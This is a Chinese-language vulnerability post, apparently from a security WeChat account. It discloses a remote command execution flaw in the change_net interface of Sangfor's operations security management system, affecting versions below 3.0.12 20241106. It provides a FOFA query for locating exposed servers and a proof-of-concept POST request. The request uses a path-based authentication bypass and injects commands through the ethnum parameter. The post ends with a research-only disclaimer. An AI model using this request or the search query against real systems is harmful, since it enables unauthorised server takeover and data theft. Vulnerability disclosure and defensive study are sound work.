#  【0day】深信服运维安全管理系统 change_net 远程命令执行漏洞  
 0day收割机   2026-03-02 05:38  
  
# 漏洞简介  
  
深信服运维安全管理系统 change_net 接口存在远程命令执行漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。  
# 影响版本  
  
低于 3.0.12 20241106  
# fofa语法  
> body="/fort/login" && header="FORTSESSIONID"  
  
# 漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWD59yUBLJatuTNlBiccAKFZFcYsxOa3JI1ia98ptFibhpGrTncwmt8294HtoUj0AQu8diaSEkrZibYXtZbBLZ1yIDqAcnWznuvbfcVY/640?wx_fmt=png&from=appmsg "")  
## POC  
> 多个参数均存在命令注入漏洞，这里以ethnum为例  
  
```
POST /fort/system;help/netConfig/change_net HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

sta=static&ipv=4&ethnum=RCE_POC &address=1.1.1.1&netmask=2.2.2.2&gateWay=3.3.3.3
```  
  
访问命令执行结果文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWDzCEAcFlia3sbcibkv4x84GSoeOd2pdA7ZSdIgV2rpLGibMWBkyJSq3qL7OF7fMe9dSzbicMrgsmPoU2HNrOe2ic25oeWYgExT0tUU/640?wx_fmt=png&from=appmsg "")  
  
成功得到命令执行  
结果  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
